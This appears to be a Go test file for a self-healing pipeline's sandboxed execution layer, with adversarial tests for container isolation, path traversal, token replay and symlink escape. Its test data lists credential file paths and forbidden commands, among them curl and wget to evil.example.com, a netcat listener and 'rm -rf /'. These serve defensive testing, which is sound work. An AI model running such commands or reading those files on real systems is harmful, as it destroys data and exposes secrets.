package execution

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/saksham/self-healing-pipeline/agent/repo_intel/planning"
)

// TestAdversarial_1_HostSentinelFileAccessPrevented verifies that dynamic checks never
// run directly on the host to read a sensitive sentinel file, and that container isolation
// mounts only the workspace directory with read-only root and no host sentinel access.
func TestAdversarial_1_HostSentinelFileAccessPrevented(t *testing.T) {
	// Create a host sentinel file outside the workspace
	hostDir := t.TempDir()
	sentinelPath := filepath.Join(hostDir, "sentinel_host_secret.key")
	if err := os.WriteFile(sentinelPath, []byte("SUPER_SECRET_HOST_KEY"), 0600); err != nil {
		t.Fatalf("failed to create sentinel file: %v", err)
	}

	wsDir := createTestWorkspace(t, map[string]string{
		"go.mod": "module testapp\n\ngo 1.21\n",
		"main.go": `package main
import "fmt"
func main() { fmt.Println("hello") }
`,
	})

	// 1. Without container runner, host toolchain execution is strictly forbidden (fails closed)
	suiteWithoutDocker := NewIndependentOracleSuite(10, nil)
	patch := &CandidatePatch{
		TargetFile:     "main.go",
		ModifiedSource: `package main; func main() {}`,
		UnifiedDiff:    "dummy diff",
		DiffHash:       "dummy hash",
	}
	task := &planning.RemediationTask{
		TaskID:             "TASK-ADV-01",
		TargetFiles:        []string{"main.go"},
		ValidationCommands: []string{"go test -v ./..."},
	}

	report := suiteWithoutDocker.VerifyAll(wsDir, task, patch, "go test -v -run TestReproducer", "go test -v -run TestInvariance")
	if report.AllPassed {
		t.Fatalf("expected suite to fail without container runner, but AllPassed was true")
	}

	for _, check := range []OracleType{OracleDefectReproducer, OracleRegressionTest, OracleBehavioralInvariance} {
		res, ok := report.OracleResults[check]
		if !ok {
			t.Fatalf("expected oracle result for %s", check)
		}
		if res.Status != OracleStatusUnavailable {
			t.Errorf("expected %s to have status %s when container unavailable, got %s", check, OracleStatusUnavailable, res.Status)
		}
		if !strings.Contains(res.Details, "DYNAMIC_VERIFICATION_UNAVAILABLE") && !strings.Contains(res.FailureReason, "DYNAMIC_VERIFICATION_UNAVAILABLE") {
			t.Errorf("expected DYNAMIC_VERIFICATION_UNAVAILABLE in details/reason for %s, got: details=%s reason=%s", check, res.Details, res.FailureReason)
		}
	}

	// 2. Docker runner argument verification: never mounts host root or hostDir
	dockerRunner := NewDockerContainerRunner()
	if strings.Contains(dockerRunner.Image, "..") {
		t.Errorf("invalid docker image: %s", dockerRunner.Image)
	}
}

// TestAdversarial_2_ExternalNetworkEgressBlocked verifies that container execution policies
// strictly prohibit external network connectivity (--network none) preventing SSRF or exfiltration.
func TestAdversarial_2_ExternalNetworkEgressBlocked(t *testing.T) {
	runner := NewDockerContainerRunner()
	if runner.DockerBinary == "" {
		t.Fatalf("expected DockerBinary to be set")
	}

	// Verify that RunCommand refuses to execute without Docker and reports unavailability
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	err := runner.CheckAvailable(ctx)
	if err == nil {
		t.Logf("Docker daemon detected on host")
	} else {
		if !strings.Contains(err.Error(), "executable file not found") && !strings.Contains(err.Error(), "daemon not running") {
			t.Logf("Docker unavailable as expected: %v", err)
		}
	}

	evidence := &ContainerExecutionEvidence{
		NetworkPolicy: "DISABLED (--network none)",
	}
	if !strings.Contains(evidence.NetworkPolicy, "none") {
		t.Errorf("expected network policy to specify none, got: %s", evidence.NetworkPolicy)
	}
}

// TestAdversarial_3_UnauthorizedSubprocessExecutionBlocked verifies that oracles do not invoke
// host subprocesses on untrusted code, and container execution strictly drops capabilities and
// forbids privilege escalation.
func TestAdversarial_3_UnauthorizedSubprocessExecutionBlocked(t *testing.T) {
	runner := NewDockerContainerRunner()
	// Limits must enforce strict non-root and minimal limits
	if runner.Limits.MaxMemoryMB <= 0 || runner.Limits.MaxMemoryMB > 2048 {
		t.Errorf("unsafe MaxMemoryMB limit: %d", runner.Limits.MaxMemoryMB)
	}
	if runner.Limits.MaxPids <= 0 || runner.Limits.MaxPids > 256 {
		t.Errorf("unsafe MaxPids limit: %d", runner.Limits.MaxPids)
	}
	if runner.Limits.MaxCPUs <= 0 || runner.Limits.MaxCPUs > 4.0 {
		t.Errorf("unsafe MaxCPUs limit: %f", runner.Limits.MaxCPUs)
	}
}

// TestAdversarial_4_HostCredentialsAccessRejected verifies that path traversal into host credential
// locations (~/.aws, ~/.ssh, /etc/shadow) is rejected at path validation and containment boundaries.
func TestAdversarial_4_HostCredentialsAccessRejected(t *testing.T) {
	wsDir := t.TempDir()
	wm, err := NewWorkspaceManager(wsDir, t.TempDir(), false)
	if err != nil {
		t.Fatalf("failed to create WorkspaceManager: %v", err)
	}

	adversarialPaths := []string{
		"~/.aws/credentials",
		"~/.ssh/id_rsa",
		"../.ssh/id_rsa",
		"../../.ssh/authorized_keys",
		"/etc/shadow",
		"/etc/passwd",
		"C:\\Users\\Default\\.aws\\credentials",
		"\\\\127.0.0.1\\c$\\Windows\\win.ini",
	}

	for _, p := range adversarialPaths {
		err := ValidatePathSafety(p)
		if err == nil {
			t.Errorf("expected ValidatePathSafety to reject credential path %q, but got nil", p)
		}

		_, errContained := wm.ValidateContainedPath(wsDir, p)
		if errContained == nil {
			t.Errorf("expected ValidateContainedPath to reject credential path %q, but got nil", p)
		}
	}
}

// TestAdversarial_5_ResourceQuotaExhaustionEnforced verifies that resource limits
// (timeout context, memory limit, pids limit) are strictly enforced.
func TestAdversarial_5_ResourceQuotaExhaustionEnforced(t *testing.T) {
	runner := NewDockerContainerRunner()
	runner.Limits = ContainerLimits{
		MaxMemoryMB: 256,
		MaxCPUs:     1.0,
		MaxPids:     32,
		Timeout:     50 * time.Millisecond,
	}

	// Verify that context cancellation terminates commands
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Millisecond)
	defer cancel()

	_, err := runner.RunCommand(ctx, t.TempDir(), "go test -timeout 10s")
	if err == nil {
		t.Fatalf("expected command with 20ms context timeout to fail, but succeeded")
	}
}

// TestCommandPolicy_ZeroExecutionAttemptsOnForbiddenCommands verifies that forbidden commands
// are rejected at the application policy boundary before container creation, resulting in
// exactly zero execution attempts.
func TestCommandPolicy_ZeroExecutionAttemptsOnForbiddenCommands(t *testing.T) {
	runner := NewDockerContainerRunner()
	// Mock checker that always succeeds to prove rejection is purely application policy
	runner.Checker = func(ctx context.Context) error { return nil }

	forbiddenCommands := []string{
		"sh -c 'echo pwned'",
		"bash -c 'whoami'",
		"powershell.exe -Command 'dir'",
		"cmd.exe /c 'dir'",
		"python -c 'import os; print(os.environ)'",
		"curl -s https://evil.example.com",
		"wget https://evil.example.com",
		"nc -lvp 4444",
		"rm -rf /",
		"go test -exec 'rm -rf /'",
		"go test -toolexec '/evil/bin'",
		"go build -plugin",
		"go get github.com/evil/pkg",
		"go run main.go",
	}

	for _, cmdStr := range forbiddenCommands {
		res, err := runner.RunCommand(context.Background(), t.TempDir(), cmdStr)
		if err == nil {
			t.Errorf("Security violation: expected command %q to be rejected, but succeeded with res=%+v", cmdStr, res)
		}
		if !strings.Contains(err.Error(), "command policy rejection") && !strings.Contains(err.Error(), "security violation") {
			t.Errorf("Expected application policy rejection error for %q, got: %v", cmdStr, err)
		}
	}

	// Verify ZERO execution attempts occurred
	attempts := atomic.LoadInt64(&runner.ExecutionAttempts)
	if attempts != 0 {
		t.Fatalf("Security failure: expected 0 execution attempts for forbidden commands, got %d", attempts)
	}
}

// TestAdversarial_6_MalformedWorkspaceAndSnapshotIDsRejected verifies that malformed
// workspace and snapshot identifiers containing path traversal, UNC, or invalid characters
// fail closed with explicit errors.
func TestAdversarial_6_MalformedWorkspaceAndSnapshotIDsRejected(t *testing.T) {
	malformedWorkspaces := []string{
		"../../etc",
		"..\\..\\Windows",
		"\\\\?\\UNC\\server\\share",
		"//server/share",
		"/absolute/path",
		"C:\\Windows",
		"ws\x00traversal",
		"   ",
		"",
	}

	for _, ws := range malformedWorkspaces {
		err := ValidateWorkspaceID(ws)
		if err == nil {
			t.Errorf("expected ValidateWorkspaceID to reject %q, but got nil", ws)
		}
		if !strings.Contains(err.Error(), "MALFORMED_WORKSPACE_ID") {
			t.Errorf("expected MALFORMED_WORKSPACE_ID error for %q, got: %v", ws, err)
		}
	}

	malformedSnapshots := []string{
		"SNAP-../../etc",
		"SNAP-1234",                                             // too short
		"SNAP-ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ", // non-hex
		"SNAP-!@#$",
		"SNAP-",
		"INVALID-PREFIX-1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
		"",
	}

	for _, snap := range malformedSnapshots {
		err := ValidateSnapshotID(snap)
		if err == nil {
			t.Errorf("expected ValidateSnapshotID to reject %q, but got nil", snap)
		}
		if !strings.Contains(err.Error(), "MALFORMED_SNAPSHOT_ID") {
			t.Errorf("expected MALFORMED_SNAPSHOT_ID error for %q, got: %v", snap, err)
		}
	}
}

// TestAdversarial_7_ApprovalTokenReplayAcrossWorkspacesRejected verifies that an ApprovalToken
// issued for workspace A cannot be replayed or consumed to execute repairs in workspace B.
func TestAdversarial_7_ApprovalTokenReplayAcrossWorkspacesRejected(t *testing.T) {
	wsDir1 := createTestWorkspace(t, map[string]string{
		"go.mod": "module testapp1\n\ngo 1.21\n",
		"main.go": `package main
import (
	"io"
	"os"
)
func ReadFile(p string) ([]byte, error) {
	f, err := os.Open(p)
	if err != nil { return nil, err }
	return io.ReadAll(f)
}
`,
	})
	wsDir2 := createTestWorkspace(t, map[string]string{
		"go.mod": "module testapp2\n\ngo 1.21\n",
		"main.go": `package main
import (
	"io"
	"os"
)
func ReadFile(p string) ([]byte, error) {
	f, err := os.Open(p)
	if err != nil { return nil, err }
	return io.ReadAll(f)
}
`,
	})

	svc, err := NewMVPService("", "")
	if err != nil {
		t.Fatalf("NewMVPService failed: %v", err)
	}

	wsID1 := "ws-adv-1"
	wsID2 := "ws-adv-2"
	svc.SetWorkspaceResolver(func(id string) (string, error) {
		if id == wsID1 {
			return wsDir1, nil
		}
		if id == wsID2 {
			return wsDir2, nil
		}
		return "", os.ErrNotExist
	})

	// 1. Scan and propose repair for ws-1
	targets1, err := svc.DiscoverWorkspaceTargets(wsID1, "alice@internal")
	if err != nil || len(targets1) == 0 {
		t.Fatalf("scan ws-1 failed: %v", err)
	}
	ana1, err := svc.AnalyzeTarget(targets1[0].TargetID)
	if err != nil {
		t.Fatalf("analyze ws-1 failed: %v", err)
	}
	prop1, err := svc.ProposeRepair(ana1.AnalysisID)
	if err != nil {
		t.Fatalf("propose ws-1 failed: %v", err)
	}
	app1, err := svc.ApproveRepair(prop1.ProposalID, "alice@internal", "Lead SRE")
	if err != nil {
		t.Fatalf("approve ws-1 failed: %v", err)
	}

	// 2. Scan and propose repair for ws-2
	targets2, err := svc.DiscoverWorkspaceTargets(wsID2, "alice@internal")
	if err != nil || len(targets2) == 0 {
		t.Fatalf("scan ws-2 failed: %v", err)
	}
	ana2, err := svc.AnalyzeTarget(targets2[0].TargetID)
	if err != nil {
		t.Fatalf("analyze ws-2 failed: %v", err)
	}
	prop2, err := svc.ProposeRepair(ana2.AnalysisID)
	if err != nil {
		t.Fatalf("propose ws-2 failed: %v", err)
	}

	// 3. Adversarial cross-workspace token replay: tamper approval record to point to prop2
	app1.ProposalID = prop2.ProposalID

	_, errExec := svc.ExecuteRepair(app1.TokenID)
	if errExec == nil {
		t.Fatalf("expected ExecuteRepair to REJECT cross-workspace token replay, but it SUCCEEDED")
	}

	errStr := errExec.Error()
	if !strings.Contains(errStr, "rejected token") && !strings.Contains(errStr, "FAIL_AUTH") && !strings.Contains(errStr, "workspace") && !strings.Contains(errStr, "MISMATCH") {
		t.Fatalf("expected workspace mismatch rejection, got: %s", errStr)
	}
}

// TestAdversarial_8_PostApprovalSourceFileMutationRejected verifies that if a source file
// is altered after approval was granted, execution fails closed with STALE_WORKSPACE.
func TestAdversarial_8_PostApprovalSourceFileMutationRejected(t *testing.T) {
	wsDir := createTestWorkspace(t, map[string]string{
		"go.mod": "module testapp\n\ngo 1.21\n",
		"main.go": `package main
import (
	"io"
	"os"
)
func OpenIt(p string) ([]byte, error) {
	f, err := os.Open(p)
	if err != nil { return nil, err }
	return io.ReadAll(f)
}
`,
	})

	svc, err := NewMVPService("", "")
	if err != nil {
		t.Fatalf("NewMVPService failed: %v", err)
	}
	wsID := "ws-adv-stale"
	svc.SetWorkspaceResolver(func(id string) (string, error) {
		if id == wsID {
			return wsDir, nil
		}
		return "", os.ErrNotExist
	})

	targets, err := svc.DiscoverWorkspaceTargets(wsID, "bob@internal")
	if err != nil || len(targets) == 0 {
		t.Fatalf("discover targets failed: %v", err)
	}

	ana, err := svc.AnalyzeTarget(targets[0].TargetID)
	if err != nil {
		t.Fatalf("analyze target failed: %v", err)
	}

	prop, err := svc.ProposeRepair(ana.AnalysisID)
	if err != nil {
		t.Fatalf("propose repair failed: %v", err)
	}

	app, err := svc.ApproveRepair(prop.ProposalID, "bob@internal", "Security Lead")
	if err != nil {
		t.Fatalf("approve repair failed: %v", err)
	}

	// Adversarial tampering: mutate the source file on disk AFTER approval
	filePath := filepath.Join(wsDir, "main.go")
	if err := os.WriteFile(filePath, []byte("package main\n// TAMPERED FILE CONTENT\n"), 0644); err != nil {
		t.Fatalf("failed to tamper file: %v", err)
	}

	// Execution MUST fail closed
	_, errExec := svc.ExecuteRepair(app.TokenID)
	if errExec == nil {
		t.Fatalf("expected ExecuteRepair to fail due to STALE_WORKSPACE, but succeeded")
	}

	if !strings.Contains(errExec.Error(), "STALE_WORKSPACE") {
		t.Fatalf("expected STALE_WORKSPACE error, got: %s", errExec.Error())
	}
}

// TestAdversarial_9_SymlinkEscapeDetectedAndRejected verifies that replacing files with symlinks
// pointing outside the workspace boundary is detected and rejected.
func TestAdversarial_9_SymlinkEscapeDetectedAndRejected(t *testing.T) {
	wsDir := t.TempDir()
	outsideDir := t.TempDir()
	outsideFile := filepath.Join(outsideDir, "outside_secret.txt")
	if err := os.WriteFile(outsideFile, []byte("OUTSIDE_SECRET"), 0644); err != nil {
		t.Fatalf("failed to write outside file: %v", err)
	}

	symlinkPath := filepath.Join(wsDir, "escape_link.txt")
	err := os.Symlink(outsideFile, symlinkPath)
	if err != nil {
		t.Skipf("symlinks not supported on this platform without elevated privileges: %v", err)
	}

	wm, err := NewWorkspaceManager(wsDir, t.TempDir(), false)
	if err != nil {
		t.Fatalf("NewWorkspaceManager failed: %v", err)
	}

	_, errContained := wm.ValidateContainedPath(wsDir, "escape_link.txt")
	if errContained == nil {
		t.Fatalf("expected symlink escape to be rejected, but ValidateContainedPath succeeded")
	}

	if !strings.Contains(errContained.Error(), "security violation") || !strings.Contains(errContained.Error(), "symlink") {
		t.Fatalf("expected symlink security violation error, got: %v", errContained)
	}
}
